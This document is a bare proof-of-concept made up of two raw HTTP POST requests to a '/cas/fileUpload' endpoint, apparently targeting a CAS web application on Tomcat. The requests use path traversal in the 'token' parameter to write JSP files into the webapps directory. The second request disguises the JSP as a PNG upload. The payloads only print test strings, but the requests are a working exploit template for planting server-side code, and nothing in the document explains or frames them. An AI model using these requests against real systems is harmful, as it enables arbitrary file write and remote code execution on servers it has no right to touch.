```
POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/a.jsp&name=123 HTTP/1.1
Host: your-ip
Content-Range: bytes 0-10/20
Referer: http://your-ip/cas/login
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

<%out.println("test");%>
```



```
POST /cas/fileUpload/fd HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
Content-Length: 217

--a4d7586ac9d50625dee11e86fa69bc71
Content-Disposition: form-data; name="token"

/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/stc11.jsp
--a4d7586ac9d50625dee11e86fa69bc71
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: image/png

<% out.println("215882935");%>  
--a4d7586ac9d50625dee11e86fa69bc71--
```

